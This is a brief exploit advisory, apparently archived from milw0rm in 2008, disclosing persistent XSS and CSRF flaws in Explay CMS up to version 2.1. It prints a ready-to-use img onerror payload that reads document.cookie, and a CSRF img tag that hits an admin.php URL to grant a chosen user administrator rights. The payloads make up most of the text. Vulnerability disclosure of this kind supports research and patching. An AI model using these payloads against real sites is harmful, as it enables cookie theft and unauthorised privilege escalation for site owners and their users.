@@ -1,0 +1,15 @@
+==================================
+Explay CMS <= 2.1 Persistent XSS and CSRF
+==================================
+Discovered by hodik
+Mail: n.khodov@gmail.com
+
+1. Persistent XSS
+This CMS has bad anti-XSS filter that cut only some basic vectors. The loginned user can inject persistent XSS by adding to article text or comment  <img src="http://google.com" onerror="alert(document.cookie)" />
+
+2. CSRF
+User can get admin rights if admin open malicious page that contain, for instance:
+<img src="http://explay.localhost/admin.php?name=users&page=1&order=user_id&set_admin=2" />
+or merely insert it to comment or article text.
+
+# milw0rm.com [2008-09-19]
